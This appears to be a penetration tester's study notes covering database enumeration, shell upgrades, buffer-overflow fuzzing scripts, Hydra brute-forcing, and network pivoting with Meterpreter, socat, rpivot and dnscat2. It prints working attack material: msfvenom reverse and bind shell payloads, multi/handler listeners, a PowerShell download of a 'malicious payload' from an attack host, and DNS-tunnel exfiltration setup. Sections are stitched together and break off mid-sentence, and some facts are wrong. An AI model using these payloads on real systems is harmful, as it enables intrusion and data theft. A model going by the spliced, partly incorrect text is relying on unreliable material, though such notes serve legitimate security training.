MySQL should never be accessible from an external network, but in many cases, it is misconfigured to allow such connections. MySQL runs on **TCP port 3306.** Once the initial system scan detects this service, a more specific scan can be executed against this service. Even if nmap doesn't detect that this port is open, it is still worth running the following scan: 
```bash
sudo nmap <IP address> -sV -sC -p3306 --script mysql*

```

Valid usernames may be yielded from this scan, depending on the results. Regardless, manually confirm the information obtained because some of the information might be a false-positive. These accounts can be tested without a password with the following command:
```bash
mysql -u <username> -h <IP address>

```

If a password is found for a specific account, and the account is able to use MySQL, perform the following command to gain access to the machine:
```bash
mysql -u <username> -p<password> -h <IP address>

```

Once inside the MySQL service, the following commands can be used to enumerate the system:
```bash
MySQL [(none)]> show databases;    

MySQL [(none)]> select version();  

MySQL [(none)]> use <database>;

MySQL [(<database>)]> show tables;

MySQL [(<database>)]> show columns from <table>;	  #shows all columns in the selected database.

MySQL [(<database>)]> select * from <table>;	      #shows everything in the desired table.

MySQL [(<database>)]> select * from <table> where <column> = "<string>";    #search for needed string in the desired table.

```

There may be several existing databases on the MySQL server. The most important databases for the MySQL server are the **sytem schema `sys`** and **information schema `information_schema`.** The system schema contains tables, information, and metadata necessary for management. The information schema also contains metadata; however, this metadata is mainly retrieved from the system schema database. The reason for the existence of these two is the established ANSI/ISO standard. System schema is a Microsoft system catalog for SQL servers and contains much more information than the informaiton schema.

### **`Enumerating MSSQL`**

While there are versions of MSSQL that run on Linux and MacOS, MSSQL instances mostly run on Windows machines. SMSS is the most common way to access MSSQL, but it can also be accessed via `mssql-cli`, `SQL Server PowerShell`, `HeidiSQL`, `SQLPro`, and **`Impackets's mssqlclient.py`.** 

When an admin initially installs and configures MSSQL to be network accessible, the SQL service will likely run as **NT SERVICE\MSSQLSERVER.** Connecting from the client-side is possible through **Windows Authentication,** and by default, encryption is not enforced when attempting to connect. 
* Authentication being set to Windows Authentication means that the underlying Windows OS will process the login request and use either the local SAM database or the domain controller (hosting AD) before allowing connectivity to the DBMS

  * Using AD can be ideal for auditing activity and controlling access in a Windows environment, but if an account is compromised, it could lead to a privilege escalation and lateral movement across a Windows domain environment. 
  
While there are many ways that MSSQL can be compromised, the following can put the service more at risk:
* MSSQL clients not using encryption to connect to the MSSQL server

* The use of self-signed certificates when encryption is being used. It is possible to spoof these self-signed certificates

* The use of named pipes

* Weak and default sa credentials. Admins may forget to disable this account

<br>

**<u>Footprinting MSSQL</u>**

There are many ways to approach footprinting an MSSQL service, but the more specific the scans are, the more useful the gathered information will be. Nmap has default MSSQL scripts that can be used to target the default **`TCP port 1433`** that MSSQL listens on. ### **`Shells and Payloads`**

A list of shells can be found in [this list](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/).

* **`Reverse Shells`:** The victim machine (client) connects to the attacking machine (server). These shells are the most common

* **`Bind Shells`:** The attacking machine (client) connects to the victim machine (server). These shells are mostly used for external penetration testing to bypass additional firewall configurations needed for that of reverse shells. if a reverse shell doesn't work, then a bind shell is used in lieu

* **`Payloads`:** While the term *payload* can have different meanings based on the context, for exploitation specifically, payloads are sent to the target machine to attempt to gain access. There are two types of payloads:
  1. **Non-Staged:** Sends exploit shellcode all at once. These payloads are larger in size and won't always work
    * windows/meterpreter_reverse_tcp in meterpreter
  2. **Staged:** Sends payload in stages. These payloads can be less stable than non-staged ones
    * windows/meterpreter/reverse_tcp in meterpreter

If the exploit is definitely correct but the payload is not working, try the other type of payload with the same type of shell. If it still doesn't work, then try another payload. 

If the target machine yields a non-TTY shell, one of the following commands can produce an interactive, stable shell:
```bash
python -c 'import pty; pty.spawn("/bin/sh")'

/bin/sh -i

perl e 'exec "/bin/sh";'

perl: exec "/bin/sh";

ruby: exec "/bin/sh"

lua: os.execute('/bin/sh')

awk 'BEGIN {system("/bin/sh")}'

find / -name <file name> -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

find . -exec /bin/sh \; -quit

vim -c ':!/bin/sh'
\\ Within vim, the following commands can also be executed:
\\
\\ :set shell=/bin/sh
\\ :shell
```

<a id="boffuzzingeteipoffsetcalc"></a>

#### **`Fuzzing and EIP Offset Calculation`**

Before running the following script, run **`Immunity Debugger`** as administrator (Windows) and then open the program. **Keep in mind that the program needs to be opened everytime a payload is sent and the bottom right says Running.** 

The following script can be used to fuzz for buffer overflow vulnerabilities on any given target:
```python
#!/usr/bin/env python3
import socket, time, sys
ip = "x.x.x.x" 
port = xxxx      
timeout = 5
prefix = "OVERFLOW  "      #modify this to meet the input requirements: command or keyword
string = prefix + "A" * 100
while True:
   try:
      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.settimeout(timeout)
         s.connect((ip, port))
         s.recv(1024)
         print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
         s.send(bytes(string, "latin-1"))
         s.recv(1024)
   except:
      print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
      sys.exit(0)
   string += 100 * "A"
   time.sleep(1)

```
This script will show the number of bytes it took for the server to crash; however, it will not give the exact number of bytes needed. It is necessary to know the exact number of bytes that the crash occurred; i.e., when the EIP was overwritten.

Based on the number of bytes from the previous command, use the following command to generate a BOF pattern:
```bash
msf-pattern_create -l <number of bytes>

```
Copy the output payload and create a new script (based off the previous), as follows:
```python
#!/usr/bin/env python3
import socket, time, sys
ip = "x.x.x.x"
port = xxxx      
timeout = 5
prefix = "OVERFLOW  "
offset = "payload"             #enter payload here
string = prefix + "A" * 100 + offset
while True:
   try:
      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.settimeout(timeout)
         s.connect((ip, port))
         s.recv(1024)
         print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
         s.send(bytes(string, "latin-1"))
         s.recv(1024)
   except:
      print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
      sys.exit(0)
   string += 100 * "A"
   time.sleep(1)

```
Now, this will give a more specific location as to where the program crashed. Look at the EIP value, copy it to the clipboard, then run the following command with that value:
```bash
msf-pattern_offset -l <number of bytes> -q <EIP value>

```
This will give an exact match at an offset. Now, rewrite the EIP to ensure that the exact offset is correct. The easiest way to do this is to modify the first script with the offset value + 100 + a known value to overwrite the EIP. This known value is used is typically 4 bytes:

```python
#!/usr/bin/env python3
import socket, time, sys
ip = "x.x.x.x"
port = xxxx  
timeout = 5
prefix = "OVERFLOW  "         
string = prefix + "A" * <offset value + 100> + "BBBB"     #changed value  
while True:
   try:
      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.settimeout(timeout)
         s.connect((ip, port))
         s.recv(1024)
         print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
         s.send(bytes(string, "latin-1"))
         s.recv(1024)
   except:
      print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
      sys.exit(0)
   string += 100 * "A"
   time.sleep(1)
```
If the EIP value is `42424242`, which is BBBB in hex, that means that the EIP was successfuly overwritten and the offset calculation was correct.

#### **`Bad Characters`**

After overwritting the EIP and successfully calculating the offset, bad characters must be known to eventually generate the shell code. They must be identified so that they can be avoided when creating a payload. Bad characters are bytes that, when included in the payload, cause unintended behavior, like truncating the payload, corrupting the shellcode, or breaking the exploit. ### **`Brute Forcing`**

* **`Simple Brute Force`:** Systematically tries all possible combinations of characters within a defined character set and length range. This can include trying all combinations of lowercase letters from 'a' to 'z' for passwords of length 4 to 6.
   * This is best used when there is no prior information abut the password available, and computational resources are abundant. 
* **`Dictionary Attack`:** Uses a pre-compiled list of common words, phrases, and passwords. This can include trying passwords from a list against a login form.
   * This is best used when the target uses a weak password based on common patterns
* **`Hybrid Attack`:** Combines elements of simple brute force and dictionary attacks, often appending or prepending characters to dictionary words. This can be adding numbers or special characters to the end of words from a dictionary list.
   * This is best used when the target potentially uses a slightly modified version of a common password
* **`Credential Stuffing`:** Leverages leaked credentials from one service to attempt access to other services, assuming users reuse passwords. This can be using a list of leaked usernames and passwords to try logging into various online accounts.
   * This is best used when a large set of leaked credentials is available, and the target is suspected of reusing passwords across multiple services
* **`Password Spraying`:** Attempts a small set of commonly used passwords against a large number of usernames.
   * This is best used when account lockout policies are in place, and the attacker aims to avoid detection by spreading attempts across multiple accounts. 
* **`Rainbow Table Attack`:** Uses pre-computed tables of password hashes to reverse hashes and recover plaintext passwords quickly. This can include pre-computing hashes for all possible passwords of a certain length and character set, then comparing captured hashes against the table to find matches
   * This is best used when a large number of password hashes need to be cracked, and the storage space for the rainbow tables is available
* **`Reverse Brute Force`:** Targets single password against multiple usernames, often used in conjunction with credential stuffing attacks
   * This is best used when there is a strong suspicion that a particular password is being reused across multiple accounts
* **`Distributed Brute Force`:** Distributes the brute forcing workload across multiple computers or devices to accelerate the process. This can include using a cluster of computers to perform a brute force attack, which significantly increases the number of combinations that can be tried per second
   * This is best used when the target password or key is highly complex, and a single machine lacks the computational power to crack it within a reasonable timeframe


Hydra can be used to dictionary/reverse brute force credentials for many different services. The following commands can be used to brute force specific services:
```bash
hydra -l <user> -P <password_list> ssh://<IP Address>:22 -t 4 -V      #ssh

hydra -l <user> -P <password_list> ftp://<IP Address> -t 4 -V         #ftp

hydra -l <user> -P <password_list> <domain.com> http-post-form "/login:user=^USER^&pass=^PASS^:S=302" -t 4 -V   #POST request

hydra -l <user> -P <password_list> <domain.com> http-get -t 4 -V            #GET request

hydra -l <user> -P <password_list> mysql://<IP Address> -t 4 -V     #mysql

hydra -l <user> -P <password_list> mssql://<IP Address> -t 4 -V     #mssql
```
> For POST and GET requests, replace the `user=` and `pass=` with the parameters used for logging in. The `S=` is used to look for a successful login indicated by the HTTP status code 302; this can be replaced by `F=` followed by the string that is displayed when the password is incorrect. 

If an SSH server allows root login, or if a username is known, it is also possible to brute force the password metasploit:
```bash
msf5 auxiliary(scanner/ssh/ssh_login) >   #set options to brute force

```

While there are many username and password lists to use to brute force credentials, it may be necessary to sometimes create custom wordlists. For password lists specifically, there may be requirements, like having a minimum number of characters, at least one capital, numbers, and some special characters. The following grep commands use regex to filter the specified password list to include these requirements:
```bash
grep -E '^.{6,}$' <password_list> | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}'

```

### **`Pivoting, Tunneling, and Port Forwarding`**

Once an initial foothold is gained on a system, it is imperative to check the privilege level, network connections, and potential VPN or other remote access software. If a host has more than one network adapter, it can likely be used to move to a different network segment. All of the following tactics are separate:

**`Pivoting`** is the idea of moving to other networks through a compromised host to find more targets on different network segments. Pivoting may use multiple hosts to cross network boundaries they would not usually have access to. This enables an attacker to move deeper into a network by compromising targeted hosts or infrastructure. The main objective is to defeat segmentation (physically and virtually) to access an isolated network
   * i.e., the target had their network physically and logically separated, making it difficult for an attacker to move around and fully compromise the network. The attacker had to search the network and compromise a host that had access to another environment, as the endpoint has more than one NIC connected to different networks. This host will now be the jump/pivot host
   * Allows an attacker to delve deeper into the networks accessing previously unreachable environments. 

* **`Tunneling`** is a subset of pivoting: it encapsulates network traffic into another protocol and routes traffic through it. For example, using HTTP to mask the C2 traffic from an attacking server to the host. *Obfuscation* is critical to avoid detection for as long as possible. For tunneling, protocols with enhanced security measures like HTTPS over TLS or SSH over other transport protocols are used. These types of attacks enable tactics like the exfiltration of data out of a target network or the delivery of more payloads and instructions into the network. 
   * i.e., typical applications like VPNs or specialized browsers are a form of tunneling network traffic. 
   * Tunneling was previously used to craft traffic to hide in HTTP and HTTPS. This is a common way to maintain a C2 of the compromised hosts within a network. Instructions can be masked inside GET and POST requests that appear as normal traffic, essentially looking like a normal web request/response to any website. If the packet were formed properly, it would be forwarded to the control server; if it were not, it would be redirected to another website, potentially throwing off the blue team member checking it out. 

**`Port Forwarding`** is a technique that allows an attacker (or a defender depending on the context) to redirect a communication request from one port to another. This uses TCP as the primary communication layer to provide interactive communication for the forwarded port; however, different application layer protocols like SSH or SOCKS (not L7) can be used to encapsulate the forwarded traffic. This can be effective in bypassing firewalls and using existing services on a compromised host to pivot to other networks. Port forwarding is also a type of pivoting. 

**`Lateral Movement`** is a technique used to further access to additional hosts, apps, and services within a network environment that can help an attacker gain access to specific domain resources to elevate their privileges. This also enables privilege escalation across hosts.
   * i.e., an attacker gains initial access to the target environment, and compromised a local admin account. They performed a network scan and found three more Windows hosts in the network. The attacker used the same local admin credentials, and one of those devices shared the same administrator account, ultimately helping them compromise the domain further. 
   * Helps spread wide within a network, elevating privileges

#### **`Local/Dynamic Port Forwarding & Metasploit`**

**<u>Local Port Forwarding</u>**

Assume the attack host is on the 10.10.15.0/24 network and the target server is on a 10.129/16 network, which has already been compromised. First, scan the target server to search for open ports, as follows:
```bash
nmap -sT -p22,3306 10.129.202.64

```
In this example, the SSH port is open; however, to access the MySQL service, the attacker can either SSH into the server and access MySQL from inside the server, or port forward it to their localhost on an arbitrary port (i.e., 1234) and access it locally. 
* If a remote exploit on the MySQL service is to be done, port forwarding must happen because in this case, MySQL is being hosted locally on the server on port 3306. 

To accomplish this, the attacker's local port (1234) must be forwarded over SSH to the server. The `-L` command tells the SSH client to request the SSH server to forward all the data that is to be sent port 1234 to localhost:3306 on the server. By doing this, the attacker should be able to access the MySQL service locally on port 1234:
```bash
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64

```
To verify whether the MySQL service was forwarded, use Netstat or Nmap to query the localhost on port 1234
```bash
netstat -antp | grep 1234

nmap -v -sV -p1234 localhost

```

If multiple ports are to be forwarded from the server to the localhost, the same syntax is used multiple times (`local_port:server:port`) to the ssh command. For example, the following command forwards the apache web server's port 80 to the attack host's local port on 8080 in addition to forwarding the server's MySQL service on port 3306 to the host's local port on 1234:
```bash
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64

```

**<u>Dynamic Port Forwarding</u>**

Once on the compromised host, enumerate the network to see what networks the target is connected to by looking at its interfaces:
   * ip a for Linux
   * ipconfig /all for Windows

From the previous example, MySQL (port 3306) was known to be open from the target machine. This is never the case; it is highly unlikely for an attacker to know which services lie on the other side of the network, so either a smaller range of IPs on the network or the entire subnet can be scanned. 
* It is important to note that this scan cannot be directly performed from the attacking machine because it will likely not have the proper routes to the network. To do this, perform a dynamic port forwarding and pivot the network packets via the already compromised target.
   * This can be done by starting a SOCKS listener on the local host, and then configuring SSH to forward that traffic via SSH to the corresponding network after connecting to the target host. This is called **SSH tunneling over SOCKS (Socket Secure) proxy.** 
      * SOCKS is a protocol that helps communicate with machines where there are firewall restrictions in place. In the case of SOCKS, the initial traffic is generated by a SOCKS client, which connects to the SOCKS server controlled by the user who wants to access a service on the client-side. Once the connection is established, network traffic can be routed through the SOCKS server on behalf of the connected client. 

This technique is often used to circumvent the restrictions put in place by firewalls, and allow an external entity to bypass the firewall and access a service within the firewalled environment. A SOCKS proxy can also be useful for pivoting and forwarding data, as they can pivot via creating a route to an external server from NAT networks. As of now, there are currently two types of SOCKS proxies: SOCKS4 and SOCKS5. SOCKS4 doesn't provide any authentication and UDP support, whereas SOCKS5 does. 

Assume an attacker starts an SSH client and requests the SSH server to allow it to send some TCP data over the ssh socket. The SSH server responds with an acknowledgement, and the SSH client then starts listening on localhost:9050. Whatever data sent to this port will be broadcasted to the entire network over SSH. The following command can be used to perform this dynamic port forwarding:
```bash
ssh -D 9050 ubuntu@10.129.202.64       #IP of the already compromised machine

```
The `-D` argument requests the SSH server to enable dynamic port forwarding. Once this has been enabled, **proxychains** is needed to route any tool's packets over the port 9050 (in this example), which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows attackers to chain multiple proxy servers together. Using proxychains, the IP address of the requesting host can be hidden as well since the receiving host will only see the IP of the pivot host. Proxychains is often used to force an application's TCP traffic to go through hosted proxies like SOCKS4/SOCKS5, TOR, or HTTP/HTTPS proxies. 

To inform proxychains that port 9050 is to be used, modify the proxychains configuration file (/etc/proxychains.conf). Then, add socks4 127.0.0.1 9050 to the last line if it is not laready there. Once this is done, start nmap with proxy chains using the following command, as it will route all the packets of nmap to the local port 9050, where the SSH client is listening, which will forward all the packets over SSH to the remote network (unaccessible from the attack host, but accessible from the target machine since it is directly connected to this network):
```bash
proxychains nmap -v -sn 172.16.5.1-200

```
This part of packing all of the nmap data using proxychains and forwarding it to a remote server is called **SOCKS tunneling;** however, only full TCP connect scans can be done over proxychains because proxychains cannot understand partial packets. If partial packets (half connect scans) are sent, the yielded results will be incorrect. Also, it is imperative to remember that host-alive checks may not work against Windows targets because the Windows Defender firewall blocks ICMP requests by default. A full TCP connect scan without ping on an entire network range will also take a long time too. 

The following command performs a remote system scan, which may disclose several open ports:
```bash
proxychains nmap -v -Pn -sT 172.16.5.19

```
Similar to the nmap scan, pivoting can also be done from msfconsole via proxychains to perform scans of the detected ports/services using metasploit auxiliary modules.

* It may not always be feasible to have a remote desktop connection; it sometimes may be better to upload/download files (when the RDP clipboard is disabed), use exploits or low-level Windows API using a Meterpreter session to perform enumeration on the Windows host, which is not possible using the built-in Windows executables.

At this point, download the malicious payload via a web browser or the PowerShell cmdlet Invoke-WebRequest on the secondary target machine, as follows:
```powershell
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"

```

#### **`Meterpreter Tunneling & Port Forwarding`**

If there is already a meterpreter shell on the initial target machine (pivot host), and an attacker wants to perform enumeration scans through the pivot host through the meterpreter session, it is possible to create a pivot with the meterpreter session without relying on SSH port forwarding. Similarly, if the attacker does not yet have a meterpreter shell on the pivot host, create one first. Now, assume that the secondary target (Windows) is on a remote network from the attack host, but the pivot host has an interface connected to that network. In this case, the firewall on the secondary target also allows ICMP requests, enabling an attacker to perform a ping sweep on the network. This can also be done with the `ping_sweep` module in meterpreter, which will generate the ICMP traffic from the pivot host to the network of the secondary target, or through a one-liner in Bash or Windows (cmd):
```bash
run post/multi/gather/ping_sweep RHOSTS=x.x.x.x/23          #subnet of secondary host

for i in {1..254} ;do (ping -c 1 x.x.x.$i | grep "bytes from" &) ;done        #bash
```
```powershell
for /L %i in (1 1 254) do ping x.x.x.%i -n 1 -w 100 | find "Reply"      #cmd

for /L %i in (1,1,255) do @ping -n 1 -w 200 x.x.x.%i > nul && echo x.x.x.%i is up      #cmd

1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}    #powershell

```
Ping sweeps may not return successful replies at first, especially when communicating across networks. This can be caused by the time it takes for a host to build its arp cache. In these cases, try to ping sweep at least twice to ensure the arp cache gets built. However, there could be scenarios when a host's firewall blocks ICMP traffic, and the ping won't yield successful replies. In these cases, perform a TCP scan on the secondary's subnet with nmap. Instead of using SSH for port forwarding, use Metasploit's post-exploitation routing module `socks_proxy` to configure a local proxy on the attack host. Configure the SOCKS proxy for SOCKS version 4a,and have it listen on port 9050 to route all the traffic received via the meterpreter session:
```bash
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run

```
After initiating the SOCKS server, configure proxychains to route traffic generated by other tools like nmao through the pivot on the initial compromised host (pivot host). Add the following line at the end of the proxychains.conf file, if it isn't already there; depending on the version the SOCKS server is running, it may be necessary to change socks4 to socks5, however:
```bash
socks4 	127.0.0.1 9050

```
Finally, tell the `socks_proxy` module to route all the traffic via the meterpreter session. This can be done with the `post/multi/manage/autoroute` module to add routes for the secondary target's subnet to route all the proxychains traffic:
```bash
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run

```
It is also possible to add routes with autoroute by running autoroute from the meterpreter session:
```bash
run autoroute -s 172.16.5.0/23
```
After adding the necessary route(s), use the `-p` option to list the active routes to ensure that the configuration is applied as expected. If this works, there should be a route to the secondary target's subnet:
```bash
run autoroute -p

```
Now, use proxychains to route the nmap traffic via the meterpreter session directly to the IP address of the secondary target:
```bash
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn

```
**<u>Port Forwarding</u>**

Port forwarding can also be accomplished using meterpreter's portfwd module. A listener can be enabled on the attack host to request meterpreter to forward all the packets received on this port via the meterpreter session to a remote host on the secondary target's subnet. In this case, the command requests the meterpreter sessiont o start a listener on the attak host's local port (`-l`) 3300 and forward all the packets to the remote (`-r`) secondary target machine 172.16.5.19 on port 3389 (`-p`) via the meterpreter session:
```bash
meterpreter > help portfwd
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

```
Now, if xfreerdp is executed on localhost:3300, a remote desktop session will be initiated. After this, use netstat to view information about the established session. From a defensive perspective, a blue teamer would benefit from using netstat if they suspect a host has been compromised:
```bash
xfreerdp /v:localhost:3300 /u:username /p:password

```
**<u>Meterpreter Reverse Port Forwarding</u>**

Similar to local port forwards, metasploit can also perform reverse port forwarding with the following command, where an attacker may want to listen on a specific port on the compromised machine and forward all incomfing shells from the initial target to the attack host. First, start a listener on a new port on the attack host for the secondary target and request the initial target (pivot host) to forward all requests recevied to the pivot host on port 1234 to the attacker's listener on port 8081

A reverse port forward can be created on the existing shell from the previous scenario using the following command. This command forwards all connections on port 1234 running on the pivot host to the attack host on local port (`-l`) 8081. Also, configure a listener on port 8081 for the secondary target, which is a Windows machine in this case:
```bash
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
meterpreter > bg
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 8081 
set LHOST 0.0.0.0 
run

```
Now, create a reverse shell payload that will send a connection back to the pivot host on the IP address connected to the network of the secondary host (172.16.5.129) and the previously specified port (1234 -> 172.16.5.129:1234) when executed on the secondary host. Once the pivot host receives this connection, it will forward that to attack host's IP:8081 that was configured:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o script.exe LPORT=1234
```
Finally, execute the payload on the secondary host, as it should be able to receive a shell from the secondary host pivoted via the pivot host.

#### **`socat`**

socat is a bidirectional relay tool that can create pipe sockets between 2 independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. 

<center>

**<u>Socat Redirection with a Reverse Shell</u>**

</center>

Start a metasploit listener first as follows:
```bash
use exploit/multi/handler
set lhost 0.0.0.0
set lport 8080
set payload linux/x64/meterpreter/reverse_tcp         #payload depends on target machine arch

```
Once this is set up, start socat on the pivot host. In this case, socat will listen on localhost on port 8080 and forward all the traffic to port 80 on the attack host (10.10.14.18):
```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80

```
Once the redirector is configured, create a payload that will connect back to the redirector, which is running on the pivot host. Start a listener on the attack host because soon as socat receives a connection from a target, it will redirect all the traffic to the attack host's listener, where the shell will be obtained. The following payload must be transferred to the secondary target, which happens to be a Windows machine:
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```
```bash
sudo msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 80
run

```
Now, test this by running the payload on the secondary target again, and the network connection from the pivot host should be seen

<br>

<center>

**<u>Socat Redirection with a Bind Shell</u>**

</center>

Similar to socat's reverse shell redirector, a socat bind shell redirector can be created. This is different from reverse shells that connect back from the secondary server to the pivot host and get redirected to the attacking machine. In the case of bind shells, the secondary server will start a listener and bind to a particular port. A bind shell payload can be created for the secondary machine (in this case a Windows host). At the same time, create a socat redirector on the pivot host, which will listen for incoming connections from a metasploit bind handler and forward that to a bind shell payload on the secondary target.

First, create a bind shell with msfvenom; in this case, the payload is specific to a Windows target:
```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443

```
Start a socat bind shell listener on the pivot host, which listens on port 8080 and forwards packets to the secondary target machine on port 8443:
```bash
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443

```
Finally, start a metasploit bind handler on the attacking machine. This bind handler can be configured to connect to the socat's listener on port 8080 from the pivot host:
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.129.202.64
set LPORT 8080
run
```
When the payload is executed on the secondary target, the bind handler will connect to a stage request pivoted via a socat listener.

#### **`Plink.exe & SSH Pivoting (sshuttle)`**

**<u>Plink</u>**

Plink (PuTTY Link) is a Windows CLI SSH tool that comes as part of the PuTTY package when installed. Similar to SSH, Plink can also be used to create dynamic port forwards and SOCKS proxies. Plink can be used to create a pivot and potentially avoid detection for a longer period. 
* This can be used when a compromised host has a moderately locked down security environment. If a Windows machine is to be the pivot host, it is unlikely that an attacker can use their own tools onto the host without being exposed; instead, they will have to rely on PuTTY being present by looking through the file shares. 

* Plink can also be used if a Windows system is the primary attack host instead of a Linux-based system. 

The Windows attack host can start a plink.exe process with the following command to start a dynamic port forward over the initial pivot host; in this case, the initial pivot host is the device that connects the attacking machine (Windows) to the secondary target machine (a Windows machine). This starts an SSH session between the Windows attack host and the initial pivot host, and then starts listening on port 9050:
```bash
plink -ssh -D 9050 ubuntu@10.129.15.50

```
[Proxifier](https://www.proxifier.com/) can also be used to start a SOCKS tunnel via the created SSH session. This is also a Windows tool that creates a tunneled network for desktop client applications and allows it to operate through a SOCKS or HTTPS proxy and allows for proxy chaining. It is possible to create a profile where the attacker can provide the configuration for the SOCKS server started by Plink on port 9050. 
   * After configuring the SOCKS server for 127.0.0.1 and port 9050, the attacker can directly start `mstsc.exe` to start an RDP session with a Windows target that allows RDP connections

<br>

**<u>sshuttle</u>**

[sshuttle](https://github.com/sshuttle/sshuttle) removes the need to configure proxychains; however, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers. This is useful for automating the execution of iptables and adding pivot rules for the remote host. sshuttle doesn't need to use proxychains to connect to the remote hosts. For example, the initial pivot host can be configured to route all of nmap's network traffic with sshuttle.  

First, install sshuttle on the attacking machine and configure it to connect to the secondary target machine (Windows) via RDP:
```bash
sudo apt-get install sshuttle
```
To use sshuttle, specify the `-r` option to connect to the remote machine with a username and password. The network or IP that are to be routed through the pivot host need to be specified; in this case, the network is 172.16.5.0/23:
```bash
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 

```
After this point, any tool can be used directly without using proxy chains. With the following command, sshuttle creates an entry in the iptables to redirect all traffic to the 172.16.5.0/23 network through the pivot host. Now, from the attacking machine, the secondary target network can be reached:
```bash
nmap -v -sV -p3389 172.16.5.19 -A -Pn
```

#### **`Web Server Pivoting (rpivot) & Windows Port Forwarding (netsh)`**

**<u>Rpivot</u>**

[Rpivot](https://github.com/klsecservices/rpivot) is a reverse SOCKS proxy tool written in Python for SOCKS tunneling; it binds a machine inside a "corporate" network to an external server and exposes the client's local port on the server-side. 

Start rpivot SOCKS proxy server using the following command to allow the client to connect on port 9999 and listen on port 9050 for proxy pivot connections; however, it may be required to start a virtual environment for this tool to work:
```bash
curl https://pyenv.run | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
source ~/.bashrc
pyenv install 2.7
pyenv shell 2.7

```
Once the repository is downloaded and the venv is set up, start the rpivot SOCKS proxy server to connect to the client on the compromised pivot host (initial target) using `server.py`. Run the following command on the attack host:
```bash
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

```
Before running `client.py`, transfer rpivot to the target. Once this is done, from the target machine, run client.py on the pivot target:
```bash
scp -r rpivot user@x.x.x.x:/home/user/
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

```
Now, configure proxychains to pivot over the local server on 127.0.0.1:9050 ont he attack host, which was initially started by the Python server. Finally, the webserver should now be accessible on the server-side, which is hosted on the internal network of 172.16.5.0/23 at 172.16.5.135:80 in this case using proxychains and firefox:
```bash
proxychains firefox-esr 172.16.5.135:80

proxychains curl http://172.16.5.135:80/

```
There could also be scenarios when an attacker cannot directly pivot to an external server (attack host) on the cloud. Some organizations have HTTP-proxy with NTLM authentication configured with the Domain Controller. In such cases, the attacker can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, use rpivot's `client.py` as follows:
```bash
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>

```

Netsh helps determine the network configuration of a particular Windows system. Netsh can be used for:

The following example assumes that the compromised host is a Windows 10-based IT admin's workstation (10.129.15.150, 172.16.5.25). #### **`DNS Tunneling (Dnscat2) & SOCKS5 Tunneling (Chisel)`**

**<u>DNS Tunneling</u>**

[Dnscat2](https://github.com/iagox86/dnscat2) uses DNS to send data between two hosts. It uses an encrypted C2 channel and sends data inside TXT records within the DNS protocol. Usually, every AD domaine environment in a corporate network will have its own DNS server, which will resolve hostnames to IP addresses and route the traffic to external DNS servers participating in the overarching DNS system; however, with **dnscat2,** the address resolution is requested from an external server. When a local DNS server tries to resolve an address, data is exfiltrated and sent over the network instead of a legitimate DNS request. Dnscat2 can be a stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections and sniff the traffic. 

For this example, a dnscat2 server is used on the attack host, and the dnscat2 client is executed on another Windows host:
```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install

```
Once this is done, start the dnscat2 server by executing the dnscat2 file:
```bash
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=domain.controller --no-cache

```
After running the server, it outputs a sevret key, which must be provided to the dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to the external dnscat2 server. The client can be used with the dnscat2 peoject or [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell), which is a dnscat2 compatible PowerShell-based client that can be run from Windows targets to establush a tunnel with the dnscat2 server. 

